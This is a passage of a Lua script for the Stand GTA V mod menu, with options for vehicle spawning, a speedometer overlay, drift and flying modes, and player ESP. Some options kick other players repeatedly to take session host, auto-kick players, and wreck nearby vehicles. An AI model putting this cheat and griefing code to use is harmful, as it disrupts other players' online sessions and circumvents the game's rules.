    tveh = 2072156101
    elseif s == 11 then
    tveh = 1739845664
    elseif s == 12 then
    tveh = -16948145
    elseif s == 13 then
    tveh = 2071877360
    elseif s == 14 then
    tveh = 1180875963
    elseif s == 15 then
    tveh = 1356124575
    elseif s == 16 then
    tveh = 433954513
    elseif s == 17 then
    tveh = -1924433270
    elseif s == 18 then
    tveh = -1860900134
    elseif s == 19 then
    tveh = -2096818938
    elseif s == 20 then
    tveh = 2044532910
    elseif s == 21 then
    tveh = -2137348917
    elseif s == 22 then
    tveh = 387748548
    elseif s == 23 then
    tveh = -1649536104
    elseif s == 24 then
    tveh = 177270108
    elseif s == 25 then
    tveh = 1518533038
    elseif s == 26 then
    tveh = 569305213
    end
end)

menu.click_slider(trailer_menu,"Trailer", {}, "1=ArmyTanker 2=ArmyTrailer 3=ArmyTrailer2 4=BaleTrailer 5=BoatTrailer 6=CableCar 7=DockTrailer 8=GrainTrailer 9=PropTrailer 10=RakeTrailer 11=TR2 12=TR3 13=TR4 14=TRFlat 15=TVTrailer 16=Tanker 17=Tanker2 18=TrailerLogs 19=TrailerSmall 20=Trailers 21=Trailers2 22=Trailers3 23=trailersmall2 24=trailerlarge", 1, 24, 1, 1, function(s)
	if s == 1 then
    trail = -1207431159
    elseif s == 2 then
    trail = -1476447243
    elseif s == 3 then
    trail = -1637149482
    elseif s == 4 then
    trail = -399841706
    elseif s == 5 then
    trail = 524108981
    elseif s == 6 then
    trail = -960289747
    elseif s == 7 then
    trail = -2140210194
    elseif s == 8 then
    trail = 1019737494
    elseif s == 9 then
    trail = 356391690
    elseif s == 10 then
    trail = 390902130
    elseif s == 11 then
    trail = 2078290630
    elseif s == 12 then
    trail = 1784254509
    elseif s == 13 then
    trail = 2091594960
    elseif s == 14 then
    trail = -1352468814
    elseif s == 15 then
    trail = -1770643266
    elseif s == 16 then
    trail = -730904777
    elseif s == 17 then
    trail = 1956216962
    elseif s == 18 then
    trail = 2016027501
    elseif s == 19 then
    trail = 712162987
    elseif s == 20 then
    trail = -877478386
    elseif s == 21 then
    trail = -1579533167
    elseif s == 22 then
    trail = -2058878099
    elseif s == 23 then
    trail = -1881846085
    elseif s == 24 then
    trail = 1502869817
    end
end)

menu.action(trailer_menu,"Spawn", {"SpawnT"}, "Pressing 2 times doesn't always work;)", function()
    local myped = players.user_ped()
    local mypos = ENTITY.GET_ENTITY_COORDS(myped)
    STREAMING.REQUEST_MODEL(tveh)
    wait()
    STREAMING.REQUEST_MODEL(trail)
    local tveh2 = entities.create_vehicle(tveh, mypos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    ENTITY.SET_ENTITY_INVINCIBLE(tveh2, true)
    wait(30)
    local trail2 = entities.create_vehicle(trail, mypos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    ENTITY.SET_ENTITY_INVINCIBLE(trail2, true)
    wait(10)
    VEHICLE.ATTACH_VEHICLE_TO_TRAILER(tveh2, trail2, 10)
end)

-------------------------------------
-- SPEEDOMETEER
-------------------------------------

 speedmeterradiantid = directx.create_texture(speedmeterradiant)
 speedmetterneedleid = directx.create_texture(speedmeterneedle)
 speedmeterrpmraddiantid = directx.create_texture(speedmeterrpmraddiant)
 speedmeterradiantidcherax = directx.create_texture(speedmeterradiantcherax)
 speedmetterneedleidcherax = directx.create_texture(speedmeterneedlecherax)
 speedmeterrrpmidcherax = directx.create_texture(speedmeterrrpmcherax)

 coordscreenspeedmetterx = 800
 menu.slider(speedmetter_menu, "Coord X", {"xcoordspeedmetter"}, "", 0, xscreensize, 800, 1, function(s)
     coordscreenspeedmetterx = s
 end)

 coordscreenspeedmettery = 800
 menu.slider(speedmetter_menu, "Coord Y", {"ycoordspeedmetter"}, "", 0, yscreensize, 800, 1, function(s)
     coordscreenspeedmettery = s
 end)
 alphaspeedmetter = 1
 menu.slider(speedmetter_menu, "Alpha", {"alphaspeedometter"}, "", 1, 100, 100, 1, function(s)
 	sf = s/100
     alphaspeedmetter = sf
 end)

 sizespeedmetter = 0.05
 menu.slider(speedmetter_menu, "Size", {"sizespeedometter"}, "", 1, 100, 5, 1, function(s)
 	sf = s/100
     sizespeedmetter = sf
end)
 speedmettertexture = 0
 menu.toggle(speedmetter_menu, "Default", {"speedmeterdefault"}, "", function()
 	if (getmenuvalue("Vehicle>SpeedMetter>Cherax") == 1) and (getmenuvalue("Vehicle>SpeedMetter>Default") == 1) then
 		trigger_command("speedmetercherax off")
 	end
 	if (getmenuvalue("Vehicle>SpeedMetter>Default") == 1) then
 		speedmettertexture = 0  
	end
 	if (getmenuvalue("Vehicle>SpeedMetter>Default") == 0) and (getmenuvalue("Vehicle>SpeedMetter>Cherax") == 0) then
 		trigger_command("speedmeterdefault on")
 	end
 end, true)

 menu.toggle(speedmetter_menu, "Cherax", {"speedmetercherax"}, "", function()
 	if (getmenuvalue("Vehicle>SpeedMetter>Default") == 1) and (getmenuvalue("Vehicle>SpeedMetter>Cherax") == 1) then
 		trigger_command("speedmeterdefault off")
 	end
 	if (getmenuvalue("Vehicle>SpeedMetter>Cherax") == 1) then
 		speedmettertexture = 1
 	end
 	if (getmenuvalue("Vehicle>SpeedMetter>Default") == 0) and (getmenuvalue("Vehicle>SpeedMetter>Cherax") == 0) then
 		trigger_command("speedmetercherax on")
 	end
 end)

 SpeedMetter = false
 menu.toggle(speedmetter_menu, "Activate SpeedMetter", {}, "", function(on)
 	SpeedMetter = on
 	if SpeedMetter then
 		alphaspeedmetterf = 0
 	else
 		alphaspeedmetterf = alphaspeedmetter
 	end
	while SpeedMetter do
		if (speedmettertexture == 0) then
			needleid = speedmetterneedleid
 			radiantid = speedmeterradiantid
			rpmradiantid = speedmeterrpmraddiantid
 			rpmneedleid = speedmetterneedleid
 			ratiorotspeed = 0.5625
 			ratiorpm = 0.00625
			stoprotrpm = 1
			ratioscreen = 10
		else
			needleid = speedmetterneedleidcherax
			radiantid = speedmeterradiantidcherax
 			rpmradiantid = speedmeterrrpmidcherax
 			rpmneedleid = speedmetterneedleidcherax
 			ratiorotspeed = 1.125
 			ratiorpm = 0.0062
 			stoprotrpm = 0.55555555555
 			ratioscreen = 7.39583333333
 		end
 		if PED.IS_PED_IN_VEHICLE(players.user_ped(), veh, true) then
 			entityspeedmetter = ENTITY.GET_ENTITY_SPEED(veh)
 			rpmspeedmetter = entities.get_rpm(entities.get_user_vehicle_as_pointer())*10000
 			needlerot = ((ratiorotspeed*entityspeedmetter)/100)
 			if needlerot > 0.755 then
 				needlerot = 0.755
 			end
 			needlerotrpm = ((ratiorpm*rpmspeedmetter)/100)
 			if needlerotrpm > stoprotrpm then
 				needlerotrpm = stoprotrpm
 			end
 			coordscreenspeedmetterxfinal = (1/xscreensize)*coordscreenspeedmetterx
 			coordscreenspeedmetteryfinal = (1/yscreensize)*coordscreenspeedmettery
 			coordscreenspeedmetterxrpmfinal = (1/xscreensize)*(coordscreenspeedmetterx-(xscreensize*ratioscreen/100))
			coordscreenspeedmetteryrpmfinal = (1/yscreensize)*(coordscreenspeedmettery)
			if alphaspeedmetterf < 0 then 
				alphaspeedmetterf = 0
			end
 			if alphaspeedmetterf < alphaspeedmetter then
				alphaspeedmetterf = alphaspeedmetterf+0.01
 			end
 			if alphaspeedmetterf >alphaspeedmetter then
 				alphaspeedmetterf = alphaspeedmetterf-0.01
			end
			directx.draw_texture(radiantid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxfinal, coordscreenspeedmetteryfinal, 0, 1, 1, 1, alphaspeedmetterf)
 			directx.draw_texture(needleid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxfinal, coordscreenspeedmetteryfinal, needlerot, 1, 1, 1, alphaspeedmetterf)
			directx.draw_texture(rpmradiantid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxrpmfinal, coordscreenspeedmetteryfinal, 0, 1, 1, 1, alphaspeedmetterf)
			directx.draw_texture(rpmneedleid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxrpmfinal, coordscreenspeedmetteryfinal, needlerotrpm, 1, 1, 1, alphaspeedmetterf)
 		end
 		if not (alphaspeedmetterf == 0 ) and not PED.IS_PED_IN_VEHICLE(players.user_ped(), veh, true)then
			alphaspeedmetterf = alphaspeedmetterf-0.01
 			directx.draw_texture(radiantid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxfinal, coordscreenspeedmetteryfinal, 0, 1, 1, 1, alphaspeedmetterf)
 			directx.draw_texture(needleid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxfinal, coordscreenspeedmetteryfinal, needlerot, 1, 1, 1, alphaspeedmetterf)
 			directx.draw_texture(rpmradiantid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxrpmfinal, coordscreenspeedmetteryfinal, 0, 1, 1, 1, alphaspeedmetterf)
 			directx.draw_texture(rpmneedleid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxrpmfinal, coordscreenspeedmetteryfinal, needlerotrpm, 1, 1, 1, alphaspeedmetterf)
 		end
 		wait()
 	end
 	while not (alphaspeedmetterf < 0 ) and not SpeedMetter do
 		if (speedmettertexture == 0) then
 			needleid = speedmetterneedleid
 			radiantid = speedmeterradiantid
 		else
 			needleid = speedmetterneedleidcherax
 			radiantid = speedmeterradiantidcherax
 		end
 		alphaspeedmetterf = alphaspeedmetterf-0.01
 		directx.draw_texture(radiantid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxfinal, coordscreenspeedmetteryfinal, 0, 1, 1, 1, alphaspeedmetterf)
 		directx.draw_texture(needleid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxfinal, coordscreenspeedmetteryfinal, needlerot, 1, 1, 1, alphaspeedmetterf)
 		directx.draw_texture(rpmradiantid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxrpmfinal, coordscreenspeedmetteryfinal, 0, 1, 1, 1, alphaspeedmetterf)
 		directx.draw_texture(rpmneedleid, sizespeedmetter, 0.1, 0.5, 0.5, coordscreenspeedmetterxrpmfinal, coordscreenspeedmetteryfinal, needlerotrpm, 1, 1, 1, alphaspeedmetterf)
 		wait()
 	end
 end)                                                        

-------------------------------------
-- DRIFT
-------------------------------------

menu.toggle_loop(drift_mod,"Driftmode", {"drift"},"Press LShift to drift",function()
	driftmod_ontick()
end)

menu.divider(drift_mod, "Settings")
menu.slider(drift_mod,"Drift Min Speed /100", {"driftMinSpeed"}, "/100", 0, 10000, gs_driftMinSpeed*100, 1, function(on)
    gs_driftMinSpeed = on/100
end)

menu.slider(drift_mod,"Drift Max Angle /100", {"driftMaxAngle"}, "/100", 0, 10000,gs_driftMaxAngle*100, 1, function(on)
    gs_driftMaxAngle = on/100
end)

menu.colour(drift_mod,"Text Colour", {"lazdrifttextcol"}, "", textDrawCol,true , function(newCol)
    textDrawCol = newCol
end)

----------------------------------------
--Fly Car
----------------------------------------

is_vehicle_flying = false
dont_stop = false
no_collision = false
speed = 1

menu.toggle(Tvehicle, "Vehicle fly", {"vehfly"}, "I recommend setting a hotkey to this option.", function(on_click)
    is_vehicle_flying = on_click
end)

menu.slider(Tvehicle, "Speed", {"speed"}, "", 1, 100, 1, 1, function(on_change) 
    speed = on_change
end)

menu.toggle(Tvehicle, "Don't stop after input", {"dontstop"}, "", function(on_click)
    dont_stop = on_click
end)

menu.toggle(Tvehicle, "No collision", {"nocolision"}, "", function(on_click)
    no_collision = on_click
end)

--------------------------------------
--Nearby entities
--------------------------------------

blackhole = false
menu.toggle(nearbyentities, "Vehicle blackhole", {"blackhole"}, "", function(on)
    if on then
        holecoords = getEntityCoords(PLAYER.PLAYER_PED_ID(), true)
        blackhole = true
        mod_uses("vehicle", 1)
    else
        blackhole = false
        mod_uses("vehicle", -1)
    end
end, false)

hole_zoff = 50
menu.slider(nearbyentities, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    hole_zoff = s
end)

beep_cars = false
menu.toggle(nearbyentities, "Infinite horn on all nearby vehicles", {"beepvehicles"}, "Makes all nearby vehicles beep infinitely. May not be networked.", function(on)
    if on then
        beep_cars = true
        mod_uses("vehicle", 1)
    else
        beep_cars = false
        mod_uses("vehicle", -1)
    end
end, false)

veh_dance = false
menu.toggle(nearbyentities, "Earthquake mode/vehicle dance", {"vehicledance"}, "Makes all vehicles dance. Or earthquake. Whichever it looks like to you. ChairX.", function(on)
    if on then
        veh_dance = true
        mod_uses("vehicle", 1)
        start_vehdance_thread()
    else
        veh_dance = false
        mod_uses("vehicle", -1)
    end
end, false)

vhp_bars = false
menu.toggle(nearbyentities, "Vehicle HP bars", {"vehhpbars"}, "Draw health bars on vehicles.", function(on)
    if on then
        vhp_bars = true
        if php_bars then
            util.toast("WARNING: You have NPC HP bars on at the same time as this! Some bars may not appear due to engine limits.")
        end
        mod_uses("vehicle", 1)
    else
        vhp_bars = false
        mod_uses("vehicle", -1)
    end
end, false)

vehicle_fuckup = false
menu.toggle(nearbyentities, "Fuck up all cars", {"fuckupcars"}, "Beats the SHIT out of all nearby cars. But this damage is only local.", function(on)
    if on then
        vehicle_fuckup = true
        mod_uses("vehicle", 1)
    else
        vehicle_fuckup = false
        mod_uses("vehicle", -1)
    end
end, false)

inferno = false
menu.toggle(nearbyentities, "Inferno", {"inferno"}, "An overdramatic \"blow up all cars\" option. Will continue to blow up all cars even when they\'re dead, just so you get that classic modder feel.", function(on)
    if on then
        inferno = true
        mod_uses("vehicle", 1)
    else
        inferno = false
        mod_uses("vehicle", -1)
    end
end, false)


godmode_vehicles = false
menu.toggle(nearbyentities, "Godmode all vehicles nearby", {"godmodecars"}, "Makes all cars nearby undamageable. Built for NPC cars, so don\'t whine when Mr. ||||||||||| sticky bombs your itali.", function(on)
    if on then
        godmode_vehicles = true
        mod_uses("vehicle", 1)
    else
        godmode_vehicles = false
        mod_uses("vehicle", -1)
    end
end)

disable_veh_colls = false
menu.toggle(nearbyentities, "Hole all nearby cars", {"nocolcars"}, "Makes all nearby cars fall through the world, or \"into a hole\".", function(on)
    if on then
        disable_veh_colls = true
        mod_uses("vehicle", 1)
    else
        disable_veh_colls = false
        mod_uses("vehicle", -1)
    end
end)

----------------------------------------
--Dirt LVl
----------------------------------------

menu.click_slider(Veh_root, "Dirt Level", {}, "", 0, 15, 0, 1, function(num)
    local veh = get_player_veh(players.user())
    if veh == nul then return end
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(veh, num)
end)

--           __  ___   ____   _____    ______
--          /  |/  /  /  _/  / ___/   / ____/
--         / /|_/ /   / /    \__ \   / /     
--        / /  / /  _/ /    ___/ /  / /___   
--       /_/  /_/  /___/   /____/   \____/ 

----------------------------------------
--dmg
----------------------------------------
--[[local colour = b_colour.new()
--#region damage numbers
local damage_numbers_target_ptr = memory.alloc(4)
local damage_numbers_tracked_entities = {}
local damage_numbers_health_colour = colour.to_stand(colour.new(20, 180, 50, 255))
local damage_numbers_armour_colour = colour.to_stand(colour.new(50, 50, 200, 255))
local damage_numbers_crit_colour = colour.to_stand(colour.new(200, 200, 10, 255))
local damage_numbers_vehicle_colour = colour.to_stand(colour.new(200, 100, 20, 255))
local damage_numbers_bone_ptr = memory.alloc(4)
local damage_numbers_target_vehicles
local damage_numbers_text_size = 0.7
local delta_time = MISC.GET_FRAME_TIME()
menu.toggle_loop(dmg, "damage numbers", {"damagenumbers"}, "", function()
   if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), damage_numbers_target_ptr) then
        local target = memory.read_int(damage_numbers_target_ptr)
        if ENTITY.IS_ENTITY_A_PED(target) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(target, false)
            if vehicle ~= 0 and damage_numbers_target_vehicles then
                if damage_numbers_tracked_entities[vehicle] == nil then
                    damage_numbers_tracked_entities[vehicle] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(vehicle)),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[vehicle].timer = 1
                end
            end
                if damage_numbers_tracked_entities[target] == nil then
                    damage_numbers_tracked_entities[target] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target) - 100),
                        armour = PED.GET_PED_ARMOUR(target),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[target].timer = 1
                end
        elseif ENTITY.IS_ENTITY_A_VEHICLE(target) and damage_numbers_target_vehicles then
            if damage_numbers_tracked_entities[target] == nil then
                damage_numbers_tracked_entities[target] = {
                    health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target)),
                    timer = 1
                }
            else
                damage_numbers_tracked_entities[target].timer = 1
            end
        end
   end
   for entity, data in pairs(damage_numbers_tracked_entities) do
        if  ENTITY.IS_ENTITY_A_PED(entity) then
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity) - 100)
            local current_armour = PED.GET_PED_ARMOUR(entity)
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, player_ped_id, 1) then
                if current_health < data.health then
                    data.timer = 1
                    PED.GET_PED_LAST_DAMAGE_BONE(entity, damage_numbers_bone_ptr)
                    if memory.read_int(damage_numbers_bone_ptr) == 31086 then
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_crit_colour, damage_numbers_text_size)
                    else
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_health_colour, damage_numbers_text_size)
                    end
                end
                if current_armour < data.armour then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.armour - current_armour, damage_numbers_armour_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - delta_time
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
            data.armour = current_armour
        else
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity))
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, player_ped_id, 1) then
                if current_health < data.health then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_vehicle_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - delta_time
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
        end
    end
end)

menu.toggle(dmg, "include vehicles", {"damagenumbersvehicles"}, "also target vehicles for damage numbers", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(dmg, "text size", {"damagenumberstextsize"}, "the size of the AR text", 1, 100, 7, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
local damage_numbers_colours_list = menu.list(dmg, "colour settings")
menu.rainbow(menu.colour(damage_numbers_colours_list, "default colour", {"damagenumcolour"}, "colour of the default hit", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "crit colour", {"damagenumcritcolour"}, "colour of the crit hit", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "armour colour", {"damagenumarmourcolour"}, "colour of the armour hit", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "vehicle colour", {"damagenumvehiclecolour"}, "colour of the vehicle hit", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))
--#endregion]]--

----------------------------------------
--bowling
----------------------------------------

menu.action(bowling, "Go to Position", {}, "", function()
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), -1366.381, -3026.5942, 13.944813)
end)

local object = {}
menu.action(bowling, "Start game!", {}, "", function()
    hashball = joaat("minitank")
    local hashpin = joaat("stt_prop_stunt_bowling_pin")
    local hashveh = joaat("vigilante")
    requestModels(hashveh, hashpin, hashball)
    local veh = VEHICLE.CREATE_VEHICLE(hashveh, -1331.3442, -3046.8249, 13.956418, 240, true, false)
    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
    local ball = VEHICLE.CREATE_VEHICLE(hashball, -1336.2491, -3044.2266, 13.959499, 240, true, false)
    local pin0 = OBJECT.CREATE_OBJECT(hashpin, -1400.6809, -3006.7837, 13.959802, true, false, true)
    local pin1 = OBJECT.CREATE_OBJECT(hashpin, -1401.5614, -3004.2598, 13.962872, true, false, true)
    local pin2 = OBJECT.CREATE_OBJECT(hashpin, -1403.197, -3007.0835, 13.957143, true, false, true)
    local pin3 = OBJECT.CREATE_OBJECT(hashpin, -1402.3384, -3001.8489, 13.965857, true, false, true)
    local pin4 = OBJECT.CREATE_OBJECT(hashpin, -1404.0249, -3004.624, 13.960155, true, false, true)
    local pin5 = OBJECT.CREATE_OBJECT(hashpin, -1405.6876, -3007.3936, 13.95448, true, false, true)
    local pin6 = OBJECT.CREATE_OBJECT(hashpin, -1403.3937, -2999.3003, 13.968807, true, false, true)
    local pin7 = OBJECT.CREATE_OBJECT(hashpin, -1404.9174, -3002.009, 13.963342, true, false, true)
    local pin9 = OBJECT.CREATE_OBJECT(hashpin, -1406.5087, -3004.8618, 13.957597, true, false, true)
    local pin10 = OBJECT.CREATE_OBJECT(hashpin, -1408.1826, -3007.6772, 13.951853, true, false, true)
    local pin11 = OBJECT.CREATE_OBJECT(hashpin, -1404.1638, -2996.855, 13.971848, true, false, true)
    local pin12 = OBJECT.CREATE_OBJECT(hashpin, -1405.702, -2999.5737, 13.9663515, true, false, true)
    local pin13 = OBJECT.CREATE_OBJECT(hashpin, -1407.3175, -3002.3909, 13.960658, true, false, true)
    local pin14 = OBJECT.CREATE_OBJECT(hashpin, -1409.4946, -3005.0793, 13.954621, true, false, true)
    local pin15 = OBJECT.CREATE_OBJECT(hashpin, -1410.606, -3008.3428, 13.948701, true, false, true)
    object[#object + 1] = veh
    object[#object + 1] = ball
    object[#object + 1] = pin0
    object[#object + 1] = pin1
    object[#object + 1] = pin2
    object[#object + 1] = pin3
    object[#object + 1] = pin4
    object[#object + 1] = pin5
    object[#object + 1] = pin6
    object[#object + 1] = pin7
    object[#object + 1] = pin9
    object[#object + 1] = pin10
    object[#object + 1] = pin11
    object[#object + 1] = pin12
    object[#object + 1] = pin13
    object[#object + 1] = pin14
    object[#object + 1] = pin15
    for _, obj in pairs(object) do
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(obj)
        OBJECT.SET_ACTIVATE_OBJECT_PHYSICS_AS_SOON_AS_IT_IS_UNFROZEN(obj, true)
    end
end)

menu.action(bowling, "Create ball", {}, "", function()
    local ball = VEHICLE.CREATE_VEHICLE(hashball, -1336.2491, -3044.2266, 13.959499, 240, true, false)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(ball)
    OBJECT.SET_ACTIVATE_OBJECT_PHYSICS_AS_SOON_AS_IT_IS_UNFROZEN(ball, true)
    object[#object + 1] = ball
end)

menu.action(bowling, "Delete all", {}, "", function()
    for _,ob in pairs(object) do
        entities.delete_by_handle(ob)
    end
end)

----------------------------------------
--ESP
----------------------------------------

menu.toggle_loop(esp, "ESP On All Players", {"catesp"}, "Enables color-proximity ESP on all players.", function ()
    local playerlist = players.list(false, true, true)
    for i = 1, #playerlist do
        espOnPlayer(playerlist[i], esp_settings.intcheck, esp_settings.disablecolorlines,
        esp_settings.text_sync, esp_settings.line_esp, esp_settings.box_esp, esp_settings.name, esp_settings.health,
        esp_settings.txtscale, esp_settings.stand_lines)
    end
end)

menu.divider(proximities, "Color Proximities")
for i = 1, #colorProximities do
    menu.slider(proximities, colorProximities[i][1] .. " range", {"catesp " .. colorProximities[i][1]}, "Range for " .. colorProximities[i][1] .. " esp.", 1, 100000, (i*200), 50, function (value)
        colorProximities[i][2] = value*value
    end)
end

menu.toggle(espenables, "Underground/interior check", {"catinterior"}, "Doesn't ESP the player if they are in an interior or are underground.", function (toggle)
    esp_settings.intcheck = toggle
end, true)

menu.toggle(espenables, "Line ESP", {"catlineesp"}, "Enables Line ESP.", function (toggle)
    esp_settings.line_esp = toggle
end, true)

menu.toggle(espenables, "Stand Line ESP", {"catstandesp"}, "Line ESP will now use Stand's draw function for lines, which goes through buildings.", function (toggle)
    esp_settings.stand_lines = toggle
end)

menu.toggle(espenables, "Box ESP", {"catboxesp"}, "Box ESP, with rotation.", function (toggle)
    esp_settings.box_esp = toggle
end)

menu.toggle(espenables, "Disable Colored Lines", {"catdisablecolorlines"}, "Disables the colored lines of the line ESP, making them all white. Has no effect on Name ESP color, though.", function (toggle)
    esp_settings.disablecolorlines = toggle
end)

menu.toggle(espenables, "Name ESP", {"catname"}, "This will draw the player's name above them, if enabled.", function (toggle)
    esp_settings.name = toggle
end)

menu.toggle(espenables, "Text ESP Syncs With Color", {"catespnamesync"}, "This will make the Name ESP have the same color as the line.", function (toggle)
    esp_settings.text_sync = toggle
end, true)

menu.toggle(espenables, "Health ESP", {"cathealth"}, "This will draw the player's health above, if enabled.", function (toggle)
    esp_settings.health = toggle
end)

menu.slider(espenables, "Scale of Text (/100)", {"catscaletext"}, "Scale of the text, divided by 100. For health and name esp.", 1, 500, 50, 10, function (value)
    esp_settings.txtscale = value/100
end)
----------------------------------------
--Host Tool
----------------------------------------
menu.slider(host_tools_list, "Max Players", {"maxplayers"}, "Set the maximum number of players in a session (only works when you are the host)", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
       toast("free slots")
    end
end)
menu.slider(host_tools_list, "Max Spectators", {"maxSpectators"}, "Set the maximum number of observers (only works when you are the host)", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        toast("free slots")
    end
end)

----------------------------------------
--Safe ass
----------------------------------------

menu.toggle_loop(Misc_root, 'Safe ass', {'testsafe'}, 'test.', function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, 1269906701, true)
wait(50)
ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, -950858008, true)
wait(250)
end)

----------------------------------------
--Player Bar
----------------------------------------

 menu.toggle(Misc_root,"Player Bar", {"playerbar"}, "Enables an overlay at the top of the screen with player information", function(on)
 	if on then
 		playerbar = true
 	else
 		playerbar = false
 	end
 end, false)

----------------------------------------
--log killers
---------------------------------------
 menu.toggle_loop(Misc_root,"Log killers", {"killlog"}, "Displays in the logs who killed whom in the session", function()
	log_kills()
end)

--------------------------------------
--Show Voice
--------------------------------------

show_voicechatters = false
menu.toggle(Misc_root, "Show me who\'s using voicechat", {"showvoicechat"}, "Displays the person who is speaking.", function(on)
    ped = PLAYER.PLAYER_PED_ID()
    if on then
        show_voicechatters = true
        mod_uses("player", 1)
    else
        show_voicechatters = false
        mod_uses("player", -1)
    end
end, false)

--------------------------------------
--Anti Oppressor
--------------------------------------

antioppressor = false
menu.toggle(Misc_root, "Antioppressor", {"antioppressor"}, "Automatically removes flying invaders in session.", function(on)
    if on then
        antioppressor = true
        mod_uses("player", 1)
    else
        antioppressor = false
        mod_uses("player", -1)
    end
end, false)

---------------------------------------
--Get Host
---------------------------------------

menu.toggle_loop(Misc_root, "Get Host", {"alwayshost"}, "Kicks people until you become the session host", function ()
	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then
		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then
			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))
			wait(200)
		end
	end
end)

--------------------------------------
--Cheak Orbital Room
--------------------------------------

menu.toggle_loop(orbitalfunc, "Cheak Orbital Room", {}, "", function()
    for pid=0,31 do
        CheakOrbRoom(pid)
    end
end)

----------------------------------------
--Show hud
----------------------------------------

onhudorbital = false
menu.toggle(orbitalfunc, "Show Hud", {}, "", function(on)
    onhudorbital = on
end, false)

----------------------------------------
--Auto kick orbital room
----------------------------------------

menu.toggle_loop(orbitalfunc, "Auto kick", {}, "", function()
    for pid = 0,32 do
        if Players[pid].orbnotify then
            local name = players.get_name(pid)
            trigger_command("kick"..name)
        end
    end
end)

--------------------------------------
--cleansallentitty
--------------------------------------

menu.action(Misc_root, "Super cleanse", {"cleansall"}, "Removes all entities in the area", function(on_click)
		local ct = 0
		toast("World is being purified")
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("yeeted all vehicles")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		util.toast("yeeted all peds")
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
		util.toast("yeeted all objects")
		toast("Purification complete, yeeted " .. ct .. " entities")
	end)


--           __  ___   ______   _   __   __  __   ____     ____              _  __    __  ___   __
--          /  |/  /  / ____/  / | / /  / / / /  / __ \   / __ \            | |/ /   /  |/  /  / /
--         / /|_/ /  / __/    /  |/ /  / / / /  / / / /  / / / /  ______    |   /   / /|_/ /  / /
--        / /  / /  / /___   / /|  /  / /_/ /  / /_/ /  / /_/ /  /_____/   /   |   / /  / /  / /___ 
